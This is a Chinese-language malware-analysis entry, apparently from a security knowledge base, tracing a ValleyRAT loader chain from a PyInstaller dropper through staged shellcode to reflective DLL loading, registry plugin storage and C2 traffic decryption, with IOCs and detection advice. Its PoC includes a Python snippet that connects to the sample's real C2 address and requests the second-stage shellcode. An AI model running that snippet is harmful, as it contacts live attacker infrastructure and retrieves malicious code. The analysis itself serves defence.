---
id: code-analysis-reverse-windows-valleyrat-staged-shellcode-codemark-reflective-pe
title: ValleyRAT 多阶段加载链：PyInstaller 投递 BGL.exe、shellcode1 按 codemark 取配置下载二期 shellcode、shellcode2 反射加载上线模块
type: scenario
domain: code-analysis
path: code-analysis/reverse/windows
technique: valleyrat-staged-shellcode-codemark-reflective-pe
tags:
- windows
- valleyrat
- silverfox
- malware-analysis
- multi-stage
- shellcode
- reflective-pe
- codemark
- c2
- registry
- upx
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V193
  verified_at: '2026-11-06T23:52:49+08:00'
  notes: 已对照原文与图12-42核对；配置108.187.7.15:447/448、codemark、0xBBA、上线模块与d33f...、登录模块192.168.1.200:6669→108.187.7.15:447一致；流量密钥按截图修正为多字节周期而非固定6666；未执行样本。
url: /docs/code-analysis/reverse/windows/code-analysis-reverse-windows-valleyrat-staged-shellcode-codemark-reflective-pe/
draft: false
kb_aliases:
- ValleyRAT
- 银狐 ValleyRAT
- villa.exe
- BGL.exe
- shellcode1
- shellcode2
- 上线模块.dll
- 登录模块.dll
- codemark 配置
- HKCU Console 插件
- NtHandleCallback
---

## 一句话结论

该 ValleyRAT（银狐系）样本是一条四段式内存加载链：`villa.exe`（PyInstaller + 尾部追加 ZIP）释放正常 `卡尔别墅.pptx` 与恶意 `BGL.exe`；`BGL.exe`（UPX）在运行时自修复 syscall 存根、解密并执行 `shellcode1`（0xBBA 字节）；`shellcode1` 在自身载荷中搜索 `codemark` 定位配置，连接 C2 发送 `64` 拉取加密数据并解出 `shellcode2`；`shellcode2` 反射加载内置 PE（`上线模块.dll`），调用其 `DllMain` 与导出函数 `load` 并把配置传入，后续通过 `HKCU\Console\1\d33f351a4aeea5e608853d1a56661059` 等注册表位置驻留插件。沙箱流量中的 `6666`/0x36 段是重复 XOR 的线索；原文 CyberChef 实际使用载荷前缀的多字节 HEX 周期密钥解出主机信息与下发的 `登录模块.dll`（见流量卡）。

## 原理

- **第一段：PyInstaller 释放器**：`villa.exe` 是 PyInstaller 2.1+/Python 3.11 程序，文件末尾追加 ZIP（16 字节 footer：ZIP 大小 + magic `0xDEADBEEFCAFEBABE`）。入口 `stub.py` 把 ZIP 解压到 `%TEMP%\packer_temp_<pid>_<uuid>`，再用 `os.startfile` 同时打开正常 PPTX 与 `BGL.exe`，诱饵遮挡恶意行为。详见 [[code-analysis-reverse-unpacking-pyinstaller-appended-zip-footer-stub-dropper]]。
- **第二段：BGL.exe 自修复与 shellcode1**：`BGL.exe`（134,144 字节，UPX，版本 4.13.747.2523）脱壳后先扫描自身内存，把占位序列 `6B 00 00 73 6B 00 00 74` 改写成 `0F 05 90 90 C3 90 CC CC`（`syscall;ret`），恢复被隐藏的系统调用；随后从自身数据解密长度为 0xBBA 的 `shellcode1`，用 `NtAllocateVirtualMemory` 分配内存、`NtProtectVirtualMemory` 改可执行、`NtCreateThreadEx` 创建线程执行（另调用 `NtQuerySystemTime`）。详见 [[code-analysis-reverse-windows-runtime-syscall-stub-self-patch]]。
- **第三段：shellcode1 配置与下载**：`shellcode1` 末尾存放配置，运行前/运行时通过搜索 `codemark` 字符串定位配置起点。原文提取到的配置为 `|p1:108.187.7.15|o1:447|...|p2:108.187.7.15|o2:448|...|p3:127.0.0.1|o3:80|...|bz:2025.11.8|...|`；它通过 `GetProcAddress` 自解析 `LoadLibraryA`、`VirtualAlloc`、`connect`、`send` 等 API，连接 C2 后先发送字符串 `"64"`，接收 C2 返回的加密数据，再按样本自带的滚动 XOR/算术密钥算法解出 `shellcode2` 并执行。解密循环中出现 `+0x36`、按位置/密钥材料取字节、每 10 字节重置索引等特征，与 Winos 系 `(key+0x36)` 滚动 XOR 的思路相近，具体密钥布局以样本为准。
- **第四段：shellcode2 反射加载 PE**：`shellcode2` 内置一个 PE（`shellcode2_PE.bin`，132,096 字节，MD5 `98C3D0A794084AADB18786C41C088A19`），在内存中解析其导出表并加载，先调用 PE 的 `DllMain`，再把 PE 的 `load` 导出函数地址返回给 shellcode1，以配置信息作为参数调用。该 PE 的字符串包含 `上线模块.dll`、`Console\1`、`d33f351a4aeea5e608853d1a56661059`。引用报告把该导出函数称为 `NtHandleCallback`，原文静态分析称 `load`；两者可能是样本版本差异或同一导出的不同命名，分析时应以实际导出表为准。
- **插件驻留**：`上线模块.dll` 使用 `HKCU\Console\1`（或 `Console\0`）下的 `d33f351a4aeea5e608853d1a56661059` 作为插件存放位置；注册表值保存加密的插件二进制，后续由上线模块/登录模块读取并加载。该路径与 Winos4/ValleyRAT 系共享，可作为家族识别特征。
- **C2 流量与插件下发**：沙箱抓包载荷中出现大量 `6666`/0x36 段；原文 CyberChef 截图显示实际 XOR Key 是以 `2809de46…`、`ede463…` 开头的多字节 HEX 周期串（其中含 `36 36 36 36`），并非固定 4 字节 ASCII `6666`。按载荷前缀恢复该周期密钥后解出主机信息与下发的 `登录模块.dll`（314,368 字节，MD5 `695485ECA04998D2E4D7BDE212465F45`）。登录模块默认配置指向内网 `192.168.1.200:6669`，运行后按配置参数替换为真实 C2 `108.187.7.15:447` 等；沙箱内存中出现 3 个文件（1 个上线模块 + 2 个已替换 C2 的登录模块副本），说明插件在内存中被二次修改后运行。
- **为什么有效**：每一阶段只负责下一阶段的解密/加载，磁盘上不出现最终 DLL；PyInstaller/UPX/自修改 syscall/编码配置/反射 PE 多层叠加，静态检测难以看到完整链；诱饵文档降低用户警觉；C2 协议简单且密钥弱。

## 触发条件

- 目标为 Windows x64 主机，用户运行 `villa.exe`；可访问 C2 `108.187.7.15:447/448`（或配置中的其它地址）。
- 样本能写入 `%TEMP%` 并启动 `BGL.exe`；BGL 能执行 UPX 解压后的代码并完成 syscall 自修复。
- shellcode1 能连接 C2 并收到加密的 shellcode2；shellcode2 能反射加载内置 PE。
- 上线模块能读写 `HKCU\Console\1`/`Console\0` 注册表并加载插件；登录模块能访问真实 C2。
- 分析侧需要 PyInstaller 解包、UPX 脱壳、IDA/x64dbg、内存 dump 与沙箱流量；部分 C2 响应为原文模拟/沙箱提取，需按实际样本复核。

## 利用步骤

1. **第一段**：`pyinstxtractor-ng` 解 `villa.exe`，`pylingual` 反编译 `stub.py`；按 footer 提取追加 ZIP，得到 `卡尔别墅.pptx`（诱饵）与 `BGL.exe`（恶意）。
2. **第二段**：`upx -d BGL.exe` 脱壳；定位 syscall 自修复函数与 shellcode1 解密函数，dump 解密后的 0xBBA 字节 shellcode1；确认 `NtAllocateVirtualMemory`/`NtProtectVirtualMemory`/`NtCreateThreadEx` 执行链。
3. **第三段**：在 shellcode1 中搜索 `codemark`，按配置字段（`p1/o1/t1`、`p2/o2/t2`、`bz` 等）解析 C2 列表与生成时间；复现 `send("64")` → 接收 → 解密，得到 shellcode2。
4. **第四段**：解析 shellcode2 的内嵌 PE，dump 出 `上线模块.dll`；查看导出表（`DllMain`、`load`/`NtHandleCallback`），确认配置参数如何传入；在 IDA 中分析注册表路径与插件加载逻辑。
5. **插件分析**：从 `HKCU\Console\1\d33f351a4aeea5e608853d1a56661059` 或内存 dump 提取插件；分析 `登录模块.dll` 的配置替换逻辑（`192.168.1.200:6669` → 真实 C2）与远控指令。
6. **流量分析**：从沙箱 PCAP 提取载荷，先试 `6666`/`0x36` 候选，再按载荷前缀周期恢复多字节密钥解密；还原主机信息、插件下发与 C2 指令（详见 [[defense-forensics-valleyrat-c2-6666-xor-traffic-decrypt]]）。
7. **家族确认**：结合 `codemark`、`Console\0|1\<md5>`、`上线模块.dll`/`登录模块.dll` 命名与 C2 协议比对 ValleyRAT/银狐情报。

## PoC

配置提取（只读分析）：

```python
data = open('shellcode1.bin', 'rb').read()
i = data.find(b'codemark')
assert i != -1
print(data[i:i+0x200])
# 原文配置示例：
# |p1:108.187.7.15|o1:447|t1:1|p2:108.187.7.15|o2:448|t2:1|
# |p3:127.0.0.1|o3:80|t3:1|...|bz:2025.11. 8|...
```

C2 首包（示意，需在隔离环境/授权测试中复现）：

```python
import socket
s = socket.create_connection(('108.187.7.15', 447), timeout=10)
s.sendall(b'64')
blob = s.recv(0x100000)
# 按样本 shellcode1 内的解密函数处理 blob，得到 shellcode2
```

C2 载荷 XOR 解密（先试 ASCII `6666`；原文实际使用载荷前缀的多字节周期密钥，见流量卡）：

```python
from pwn import xor
cipher = open('c2_payload.bin', 'rb').read()
plain = xor(cipher, b'6666')          # 先试常见候选
# 若不可读，找前缀最小周期 p，以 cipher[:p] 作为重复密钥
p = next((n for n in range(1, 65) if cipher[:n] == cipher[n:2*n]), None)
if p:
    plain = xor(cipher, cipher[:p])
open('c2_payload.dec', 'wb').write(plain)
print(plain[:256])
```

注册表插件位置：

```text
HKCU\Console\1\d33f351a4aeea5e608853d1a56661059
HKCU\Console\0\d33f351a4aeea5e608853d1a56661059
```

## 变体与关联

- 变体：C2 列表/端口会变，配置字段顺序可能随生成器版本变化；`codemark` 可能换成其它标记（Winos4 中还有 `xiugaishiyong`）。
- 变体：shellcode1 的下载 URL/协议可能是 HTTP、原始 TCP 或云存储；shellcode2 可能直接在内存中解密 PE 而不落盘。
- 变体：上线模块的导出名/注册表键可能变化（`load` vs `NtHandleCallback`、`Console\0` vs `Console\1`）；插件可能从注册表、文件或 C2 加载。
- 关联：[[code-analysis-reverse-unpacking-pyinstaller-appended-zip-footer-dropper]]（第一段）、[[code-analysis-reverse-windows-runtime-syscall-stub-self-patch]]（第二段）、[[defense-forensics-valleyrat-c2-6666-xor-traffic-decrypt]]（流量解密）、[[code-analysis-reverse-windows-winos4-builder-resource-config-injection]]（codemark/xiugaishiyong 配置注入）、[[pentest-c2-shellcode-embedded-pe-bytewise-api-decrypt-loader]]（shellcode 内嵌 PE 自加载）、[[pentest-c2-staged-downloader-multi-target-injection-veh-fallback]]（Winos 分阶段下载链）。
- 边界：C2 不可达、样本版本/密钥不匹配、反射 PE 加载失败、注册表不可写或被 EDR 拦截时，链路中断。

## 检测与防御

- **静态/样本侧**：YARA 匹配 PyInstaller + 尾部 ZIP footer magic、UPX `BGL.exe`、`codemark`、`上线模块.dll`/`登录模块.dll`、`d33f351a4aeea5e608853d1a56661059`；检查 PE overlay 与内存中的反射 PE。
- **主机侧**：监控 `%TEMP%\packer_temp_*` → `BGL.exe` 的父子链；监控 `HKCU\Console\0|1` 下 MD5 命名值的写入/读取；关注 `NtAllocateVirtualMemory`/`NtProtectVirtualMemory`/`NtCreateThreadEx` 组合与自进程内存写；Sysmon 1/7/8/10/11/12/13。
- **网络侧**：对 `108.187.7.15:447/448` 等 IOC 告警；检测 C2 载荷中反复出现的 `6666`/`0x36` 模式及前缀周期；对原始 TCP 载荷先试 `6666`、再按前缀周期密钥 XOR 以还原内容；结合 JA3/域名/证书做家族聚类。
- **防御**：应用白名单阻止未签名 PyInstaller/UPX 样本；限制 `%TEMP%` 可执行与 `Console` 注册表写入；EDR 启用内存扫描与反射 PE 检测；邮件/网关联动拦截带诱饵文档的压缩包。
- **响应**：隔离主机，提取 `%TEMP%` 与注册表插件、内存 dump；按上述阶段还原 C2 与插件；清除持久化并轮换凭据。
